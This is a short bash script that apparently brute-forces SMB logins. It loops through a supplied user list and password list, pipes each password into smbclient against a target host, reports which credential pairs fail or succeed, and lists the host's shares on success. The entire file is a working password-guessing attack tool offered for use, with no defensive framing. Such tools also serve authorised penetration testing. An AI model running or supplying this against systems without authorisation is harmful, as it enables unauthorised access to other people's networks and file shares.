#!/bin/bash
#By YaSsInE
RED='\033[0;31m'
GR='\033[0;32m'
failed='NT_STATUS_LOGON_FAILURE'
timed_out='NT_STATUS_IO_TIMEOUT'
success='Sharename'
if [ "$#" -ne 3 ]; then
	echo "usage: ./smb-login-brute.sh user-file.txt password-file.txt host"
	exit
fi
if [[ ! -e $1 ]];then
	printf "${RED}[-] Can not open $1 !\n"
	exit
fi
if [[ ! -e $2 ]];then
        printf "${RED}[-] Can not open $2 !\n"
        exit
fi
for i in $(cat $1);do
	for j in $(cat $2);do
		res=$(echo $j | smbclient -L $3 -U $i);
		if [[ "$res" == *"$failed"* ]]; then
  			printf "${RED}[-] login failed $i:$j\n"
		fi
		if [[ "$res" == *"$success"* ]]; then
			printf "${GR}[+] login successful $i:$j\n"
			echo $j | smbclient -L $3 -U $i
		fi
		if [[ "$res" == *"$timed_out"* ]]; then
			printf "${RED}[-] Connection timed out !\n"
		fi
	done
done
